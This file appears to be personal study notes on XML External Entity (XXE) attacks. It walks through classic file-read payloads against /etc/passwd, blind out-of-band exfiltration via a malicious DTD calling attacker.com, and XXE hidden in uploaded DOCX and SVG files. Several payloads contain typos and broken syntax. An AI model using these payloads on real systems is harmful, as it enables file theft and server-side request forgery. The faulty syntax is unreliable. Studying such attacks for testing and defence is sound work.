@@ -1,0 +1,110 @@
+XML External Entities:(XXE)
+=====================
+Basics of XML:
+	<? xml version="1.0" encoding="ISO-8859-1" ?>
+		<!--1st line of every XML document-->
+		<!--Encoding attribute is optional-->
+	DTD:(Document Type Definition)
+		contains declarations that define the structure of XML document
+		<!DOCTYPE name[
+			<!ELEMENT name ANY> #way-1
+			<!ELEMENT name (#ANY)> #way-2
+			<!ENTITY abcd SYSTEM "file:///etc/passwd"
+		]>
+		Using DTD:
+		<name>&abcc;</name>
+	Entities:
+		a way to represent data in XML document
+		Regular entities:	
+			Internal entity:
+				an entity whose value is defined as a string literal
+				<!ENTITY Name_of_variable "string">
+			External entity:
+				an entity whose definition is located outside of DTD
+				<!ENTITY Name_of_variable SYSTEM "http://ip/">
+				<!ENTITY Name_of_variable SYSTEM "file:// /etc/passwd">
+		Parameter entity:
+			sometimes, XXE attacks using regular entities are blocked, that time we use paramater entities
+			<!DOCTYPE foo[
+				<!ENTITY % name "string value"> # declaration
+				%name; # usage
+			]>			
+	example of file.xml:
+		<!DOCTYPE name[
+			<!ELEMENT name ANY>
+			<!ENTITY abcd SYSTEM "file:///etc/passwd"
+		]>
+		<name>&abcc;</name>
+Overview:
+	we upload malicious xml files here
+	types of XXE attacks:
+		to retrive files:
+			here an external entity is DEFINED containing contents of a file and we get the file in response of webapp
+		exploiting to perform SSRF
+		exploiting blind XXE (OOB)
+		exploiting blind XXE via error message
+Where to look for XXE:
+	POST/GET param with XML document
+	via file uploads
+	via modified content types
+Classic XXE:
+	it is done in Requests(POST/GET) having XML document embedded
+	Intercept the Request in Burp
+	convert GET to POST
+	add a header "Content-Type:application/xml" (or if "Content-Type" header is already present change it to "Content-Type:application/xml")
+	Now, add the following lines at the end of XML metadata:
+		<!DOCTYPE foo[
+			<!ENTITY xxe SYSTEM "file:///etc/passwd"
+		]>
+	now, add '&xxe;' between the tages writtin XML document
+		example:
+			before: <stock_id>5</stock_id>
+			after: <stock_id>&xxe;</stock_id>
+		Try '&xxe; one-by-one in between every pair of tags till it works
+	if it didnt work => Blind XXE
+Blind XXE:
+	https://blog.zsec.uk/blind-xxe-learning/
+	arises when webapp is vuln, but doesnt return values of any defined external entities within its responses
+	it can be done in 2 ways:
+		Using Out-Of-Band(OOB):
+			follow same steps of classic XXE with the following changes:
+				<!ENTITY xxe SYSTEM "http://burp_collab_payload">
+			if it will work, we will see DNS/HTTP interaction on Burp Collab
+			sometimes, regular entities are blocked, so we use paramater entity
+			checking if blind xxe exists:
+				<!DOCTYPE foo[
+					<!ENTITY % xxe "http://burp_collab_payload">
+					%xxe;
+				]>	
+			extracting data/files:
+				make malc.dtd and save it on attacker.com:
+					<!ENTITY % file SYSTEM "file:///etc/passwd">
+					<!ENTITY % eval "<!ENTITY &#X25; exfiltrate SYSTEM 'http://attacker.com/?x=%file;'>">
+					%eval;
+					%exfiltrate;
+				then in xml metadat add:
+					<!DOCTYPE foo[
+						<!ENTITY % xxe SYSTEM "http://attacker.com/malc.dtd">
+						% xxe;
+					]>
+				this wat, /etc/passwd will be transmitted to attacker.com
+		Using Error Messages:
+XXE via file upload:
+	can be both classic and blind
+	try uploading any_file.xml to test if any validation is present
+	if file upload validations are present, then, it depends on what type of files are allowed to be uploaded. For example files such as xlsx/pptx/docx/svg have a .xml file in thier structure so we can use them to do XXE.
+	For XLSX/PPTX/DOCX:
+		open the file in 7-zip and extract them and in .xml, append these:
+			<!DOCTYPE Hi[
+				<!ELEMENT hiany>
+				<!ENTITY xxe1 SYSTEM "file:///etc/passwd">
+				<!ENTITY xxe2 SYSTEM "http://burp_collab_payload">
+			]>
+			<hi>&xxe1;&xxe2;</hi>
+	For SVG:
+		save it as malc.svg annupload it and wait for response in Burp collab
+			<?xml version="1.0" standalone="yes"?>
+			<DOCTYPE hi[
+				<!ENTITY xxe SYSTEM "hhtp://burp_collab_payload">
+			]>
+			<svg width="128 px" height="124 px" xmlns="http://www.w3.org/2000/svg" xlms:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
